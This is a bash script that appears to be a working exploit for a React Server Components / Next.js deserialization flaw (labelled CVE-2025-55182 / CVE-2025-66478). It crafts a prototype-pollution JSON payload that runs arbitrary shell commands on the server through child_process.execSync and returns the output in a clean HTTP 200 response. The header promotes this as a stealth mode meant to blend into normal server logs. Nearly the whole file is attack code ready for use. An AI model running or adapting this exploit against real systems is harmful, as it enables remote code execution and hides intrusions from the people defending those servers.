#!/bin/bash
# exploit-reflect.sh - React2Shell with HTTP 200 stealth exfil (CVE-2025-55182 / CVE-2025-66478)
#
# Maximum stealth mode: uses a valid action ID to get clean HTTP 200 response.
# Command output appears in RSC response body (no error, no redirect).
# Looks like normal server action traffic in logs.
#
# Requirements:
#   1. Valid action ID (use enumerate-actions.sh to discover)
#   2. Action should accept and return/echo its input (common patterns: search, validate, log)
#
# How it works:
#   - Payload: arguments[0]([execSync('CMD').toString()])
#   - arguments[0] is the Promise resolve callback
#   - Calling resolve([output]) completes the deserialization with our output as action arg
#   - Action is invoked with our output as argument and returns it
#   - HTTP 200 with output in RSC response body
#
# Usage: ./exploit-reflect.sh [TARGET_URL] [ACTION_ID] [COMMAND]
# Example: ./exploit-reflect.sh http://localhost:3443 "abc123...def" "id"

set -e

TARGET="${1:-http://localhost:3443}"
ACTION_ID="${2:-}"
COMMAND="${3:-id}"

echo "[*] React2Shell Exploit - reflect mode (CVE-2025-55182 / CVE-2025-66478)"
echo "[*] Target: ${TARGET}"
echo "[*] Action ID: ${ACTION_ID:-<not provided>}"
echo "[*] Command: ${COMMAND}"
echo ""

if [[ -z "$ACTION_ID" ]]; then
    echo "[-] Action ID required for reflect mode"
    echo "[*] Use enumerate-actions.sh to discover valid action IDs:"
    echo "    ./enumerate-actions.sh ${TARGET}"
    echo ""
    echo "[*] Or use a different exploit mode:"
    echo "    ./exploit-redirect.sh ${TARGET} \"${COMMAND}\"  # HTTP 303, no action ID needed"
    echo "    ./exploit-throw.sh ${TARGET} \"${COMMAND}\"     # HTTP 500, dev mode only"
    exit 1
fi

TMPDIR=$(mktemp -d)
CHUNK0="${TMPDIR}/chunk0.json"
CHUNK1="${TMPDIR}/chunk1.json"

cleanup() {
    rm -rf "${TMPDIR}"
}
trap cleanup EXIT

# Escape single quotes in command for JavaScript string
ESCAPED_CMD=$(echo "$COMMAND" | sed "s/'/\\\\'/g")

# Build reflect payload:
# - Execute command and capture output as string
# - Call arguments[0] (the Promise resolve callback) with [output] as action arguments
# - This resolves the deserialization Promise, allowing action lookup to proceed
# - The action receives our output as its first argument
PAYLOAD="arguments[0]([process.mainModule.require('child_process').execSync('${ESCAPED_CMD}').toString()]);"

# Build the JSON payload
printf '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"%s","_formData":{"get":"$1:constructor:constructor"}}}' "$PAYLOAD" > "${CHUNK0}"

printf '"$@0"' > "${CHUNK1}"

# Send exploit with valid action ID
RESPONSE=$(curl -s -D - \
    -X POST "${TARGET}" \
    -H "Next-Action: ${ACTION_ID}" \
    -F "0=<${CHUNK0}" \
    -F "1=<${CHUNK1}" \
    --max-time 30 \
    2>&1)

# Extract HTTP status code
HTTP_CODE=$(echo "$RESPONSE" | grep -E "^HTTP/" | tail -1 | awk '{print $2}')

# Extract body (everything after blank line)
BODY=$(echo "$RESPONSE" | sed -n '/^\r$/,$p' | tail -n +2)

echo "[*] HTTP Status: ${HTTP_CODE}"
echo ""

if [[ "${HTTP_CODE}" == "200" ]]; then
    echo "[+] HTTP 200 - Reflect mode successful!"
    echo "[*] Response body (RSC format):"
    echo "----------------------------------------"
    echo "$BODY"
    echo "----------------------------------------"
    echo ""

    # Try to extract command output from RSC response
    # The output should appear as a string value in the Flight protocol response
    # Look for patterns like: 1:["output here"]  or  "data":"output here"
    if echo "$BODY" | grep -q "uid=\|root:\|/bin/"; then
        echo "[+] Command output detected in response"
    fi

elif [[ "${HTTP_CODE}" == "404" ]]; then
    echo "[-] HTTP 404 - Action ID not found"
    echo "[*] The action ID '${ACTION_ID}' does not exist on this target."
    echo "[*] Use enumerate-actions.sh to find valid IDs:"
    echo "    ./enumerate-actions.sh ${TARGET}"

elif [[ "${HTTP_CODE}" == "500" ]]; then
    echo "[-] HTTP 500 - Action invocation failed"
    echo "[*] The action may not accept the injected argument format."
    echo "[*] Response:"
    echo "$BODY" | head -20
    echo ""
    echo "[*] Try a different action or use exploit-redirect.sh instead."

elif [[ "${HTTP_CODE}" == "303" ]]; then
    # Unexpected - our payload shouldn't trigger redirect
    echo "[?] HTTP 303 - Unexpected redirect"
    REDIRECT=$(echo "$RESPONSE" | grep -i "^x-action-redirect:" | sed 's/^[^:]*: //')
    echo "[*] Redirect: $REDIRECT"

else
    echo "[-] Unexpected HTTP ${HTTP_CODE}"
    echo "$RESPONSE" | head -30
fi
